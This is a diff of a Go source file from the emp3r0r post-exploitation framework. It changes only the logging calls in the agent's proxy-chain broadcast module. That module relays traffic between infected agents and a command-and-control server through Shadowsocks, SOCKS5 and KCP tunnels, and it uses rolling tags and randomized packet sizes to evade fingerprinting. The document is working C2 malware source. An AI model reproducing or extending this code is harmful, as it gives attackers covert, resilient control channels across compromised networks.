@@ -7,7 +7,7 @@ import (
 	"encoding/binary"
 	"fmt"
 	"hash/crc32"
-	"log"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net"
 	"net/url"
 	"sync"
@@ -63,7 +63,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		return
 	}
 	defer pc.Close()
-	log.Println("BroadcastServer started")
+	logging.Println("BroadcastServer started")
 
 	buf := make([]byte, 1024)
 
@@ -74,7 +74,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			common.RuntimeConfig.Password,
 			common.RuntimeConfig.SSHHostKey)
 		if err != nil {
-			log.Printf("SSHProxyServer: %v", err)
+			logging.Printf("SSHProxyServer: %v", err)
 		}
 	}()
 
@@ -88,7 +88,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			def.MagicString,
 			ctx, cancel)
 		if err != nil {
-			log.Printf("KCP tunnel for reverse proxy: %v", err)
+			logging.Printf("KCP tunnel for reverse proxy: %v", err)
 		}
 	}()
 
@@ -106,7 +106,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		for {
 			if common.RuntimeConfig.C2TransportProxy != "" {
 				if transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
-					log.Printf("BroadcastServer reverse proxy checker: proxy '%s' is already working", common.RuntimeConfig.C2TransportProxy)
+					logging.Printf("BroadcastServer reverse proxy checker: proxy '%s' is already working", common.RuntimeConfig.C2TransportProxy)
 					util.TakeASnap()
 					continue
 				}
@@ -122,7 +122,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			util.TakeASnap()
 		}
 		common.RuntimeConfig.C2TransportProxy = rproxy
-		log.Printf("[+] Reverse proxy configured to %s", rproxy)
+		logging.Printf("[+] Reverse proxy configured to %s", rproxy)
 
 		// pass the proxy to others
 		if common.RuntimeConfig.C2TransportProxy == rproxy {
@@ -134,14 +134,14 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 	for ctx.Err() == nil {
 		n, addr, err := pc.ReadFrom(buf)
 		if err != nil || n == 0 {
-			log.Printf("BroadcastServer has read nothing: %v", err)
+			logging.Printf("BroadcastServer has read nothing: %v", err)
 			continue
 		}
-		log.Printf("BroadcastServer: received %d bytes from %s", n, addr)
+		logging.Printf("BroadcastServer: received %d bytes from %s", n, addr)
 
 		// Filter 1: Check length (ignore tiny runt packets < 32 bytes)
 		if n < 32 {
-			log.Printf("BroadcastServer: dropped tiny packet (%d bytes) from %s", n, addr)
+			logging.Printf("BroadcastServer: dropped tiny packet (%d bytes) from %s", n, addr)
 			continue
 		}
 
@@ -159,7 +159,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		// Validate: Does the packet header match either valid tag?
 		tag := buf[:4]
 		if !bytes.Equal(tag, validTagCurrent) && !bytes.Equal(tag, validTagPrev) && !bytes.Equal(tag, validTagNext) {
-			log.Printf("BroadcastServer: dropped packet from %s. Tag: %x. Expected: %x / %x / %x. Time: %d (Slot %d)",
+			logging.Printf("BroadcastServer: dropped packet from %s. Tag: %x. Expected: %x / %x / %x. Time: %d (Slot %d)",
 				addr, tag, validTagCurrent, validTagPrev, validTagNext, now, currentSlot)
 			continue // Invalid or expired tag
 		}
@@ -176,11 +176,11 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 			continue
 		}
 
-		log.Printf("BroadcastServer: received beacon from %s", srcIP)
+		logging.Printf("BroadcastServer: received beacon from %s", srcIP)
 
 		if common.RuntimeConfig.C2TransportProxy != "" &&
 			transport.IsProxyOK(common.RuntimeConfig.C2TransportProxy, def.CCAddress) {
-			log.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
+			logging.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
 			continue
 		}
 
@@ -191,14 +191,14 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		// Check deduplication
 		if common.RuntimeConfig.C2TransportProxy == proxy_url {
 			if transport.IsProxyOK(proxy_url, def.CCAddress) {
-				log.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
+				logging.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
 				continue
 			}
 		}
 
 		// Check if local Shadowsocks client is running
 		if !netutil.IsPortOpen("127.0.0.1", common.RuntimeConfig.ShadowsocksLocalSocksPort) {
-			log.Printf("BroadcastServer: starting Shadowsocks client for %s", srcIP)
+			logging.Printf("BroadcastServer: starting Shadowsocks client for %s", srcIP)
 			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
 			// give it some time to start
 			time.Sleep(1 * time.Second)
@@ -210,7 +210,7 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		// if the proxy is not working
 		// restart Shadowsocks local socks5 proxy
 		if !is_proxy_ok {
-			log.Printf("BroadcastServer: proxy %s failed, restarting Shadowsocks client pointing to %s", proxy_url, srcIP)
+			logging.Printf("BroadcastServer: proxy %s failed, restarting Shadowsocks client pointing to %s", proxy_url, srcIP)
 			c2transport.SS_Cancel()
 			c2transport.SS_Ctx, c2transport.SS_Cancel = context.WithCancel(context.Background())
 			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
@@ -223,14 +223,14 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 
 		if is_proxy_ok {
 			common.RuntimeConfig.C2TransportProxy = proxy_url
-			log.Printf("[+] Thank you! Proxy '%s' usable!", proxy_url)
-			log.Printf("BroadcastServer: %s set as common.RuntimeConfig.AgentProxy\n", common.RuntimeConfig.C2TransportProxy)
+			logging.Printf("[+] Thank you! Proxy '%s' usable!", proxy_url)
+			logging.Printf("BroadcastServer: %s set as common.RuntimeConfig.AgentProxy\n", common.RuntimeConfig.C2TransportProxy)
 
 			// pass the proxy to others
 			go passProxy(ctx, cancel, &passProxyCnt)
 
 		} else {
-			log.Printf("[-] Oh crap! %s doen't work, we have to wait for a usable proxy", proxy_url)
+			logging.Printf("[-] Oh crap! %s doen't work, we have to wait for a usable proxy", proxy_url)
 		}
 	}
 	return
@@ -241,25 +241,25 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 	// one time only
 	*count++
 	if *count > 1 {
-		log.Printf("passProxy count %d, aborting", *count)
+		logging.Printf("passProxy count %d, aborting", *count)
 		return
 	}
 
 	proxyAddr := common.RuntimeConfig.C2TransportProxy
 	parsed_url, err := url.Parse(proxyAddr)
 	if err != nil {
-		log.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
+		logging.Printf("TCPFwd: invalid proxy addr: %s", proxyAddr)
 		return
 	}
 	go func() {
 		if parsed_url.Hostname() == "127.0.0.1" {
-			log.Printf("common.RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
+			logging.Printf("common.RuntimeConfig.AgentProxy is %s, we are already serving the proxy, let's start broadcasting right away", proxyAddr)
 			return
 		}
-		log.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
+		logging.Printf("[+] BroadcastServer: %s will be served here too, let's hope it helps more agents\n", proxyAddr)
 		err := transport.TCPFwd(parsed_url.Host, common.RuntimeConfig.AgentSocksServerPort, ctx, cancel)
 		if err != nil {
-			log.Print("TCPFwd: ", err)
+			logging.Print("TCPFwd: ", err)
 		}
 	}()
 	go StartBroadcast(false, ctx, cancel)
@@ -268,7 +268,7 @@ func passProxy(ctx context.Context, cancel context.CancelFunc, count *int) {
 func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.CancelFunc) {
 	// disable broadcasting when interval is 0
 	if common.RuntimeConfig.ProxyChainBroadcastIntervalMax == 0 {
-		log.Println("Broadcasting is turned off, aborting")
+		logging.Println("Broadcasting is turned off, aborting")
 		return
 	}
 
@@ -276,29 +276,29 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 		// start a socks5 proxy
 		err := Socks5Proxy("on", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
 		if err != nil {
-			log.Printf("Socks5Proxy on: %v", err)
+			logging.Printf("Socks5Proxy on: %v", err)
 			return
 		}
 		defer func() {
 			err := Socks5Proxy("off", "0.0.0.0:"+common.RuntimeConfig.AgentSocksServerPort)
 			if err != nil {
-				log.Printf("Socks5Proxy off: %v", err)
+				logging.Printf("Socks5Proxy off: %v", err)
 			}
 		}()
 	}
 
 	defer func() {
-		log.Print("Broadcasting stopped")
+		logging.Print("Broadcasting stopped")
 		cancel()
 	}()
 
 	for ctx.Err() == nil {
-		log.Print("Broadcasting our proxy...")
+		logging.Print("Broadcasting our proxy...")
 
 		// [IMPORTANT] Generate the tag FRESH for this moment
 		timeSlot := time.Now().Unix() / 30
 		magicTag := getRollingTag(timeSlot)
-		log.Printf("StartBroadcast: sending tag %x for slot %d (Time: %d)", magicTag, timeSlot, time.Now().Unix())
+		logging.Printf("StartBroadcast: sending tag %x for slot %d (Time: %d)", magicTag, timeSlot, time.Now().Unix())
 
 		// Prepare payload: Tag (4 bytes) + Random (28+ bytes)
 		// Randomize packet size to avoid fingerprinting (32 to 256 bytes)
@@ -322,13 +322,13 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 			dst := broadcastAddr + ":" + common.RuntimeConfig.ProxyChainBroadcastPort
 			addr, err := net.ResolveUDPAddr("udp4", dst)
 			if err != nil {
-				log.Printf("StartBroadcast resolve %s: %v", dst, err)
+				logging.Printf("StartBroadcast resolve %s: %v", dst, err)
 				continue
 			}
 
 			conn, err := net.ListenPacket("udp4", ":0")
 			if err != nil {
-				log.Printf("StartBroadcast listen: %v", err)
+				logging.Printf("StartBroadcast listen: %v", err)
 				continue
 			}
 
@@ -336,9 +336,9 @@ func StartBroadcast(start_socks5 bool, ctx context.Context, cancel context.Cance
 			conn.Close()
 
 			if err != nil {
-				log.Printf("StartBroadcast send to %s: %v", dst, err)
+				logging.Printf("StartBroadcast send to %s: %v", dst, err)
 			} else {
-				log.Printf("StartBroadcast: sent beacon to %s", dst)
+				logging.Printf("StartBroadcast: sent beacon to %s", dst)
 			}
 		}
 		time.Sleep(time.Duration(util.RandInt(common.RuntimeConfig.ProxyChainBroadcastIntervalMin, common.RuntimeConfig.ProxyChainBroadcastIntervalMax)) * time.Second)
